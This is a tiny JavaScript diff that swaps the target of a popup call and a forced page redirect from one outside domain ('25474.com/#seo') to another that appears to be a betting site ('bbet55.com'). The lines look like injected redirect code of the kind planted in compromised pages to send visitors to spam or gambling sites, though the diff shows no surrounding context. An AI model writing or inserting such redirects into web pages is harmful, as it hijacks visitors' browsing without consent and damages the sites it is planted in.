@@ -1,3 +1,3 @@
- window.open ("http://25474.com/#seo"); 
+window.open ("http://bbet55.com/"); 
  
- window.location.href="http://25474.com/#seo"; 
+window.location.href="http://bbet55.com/"; 
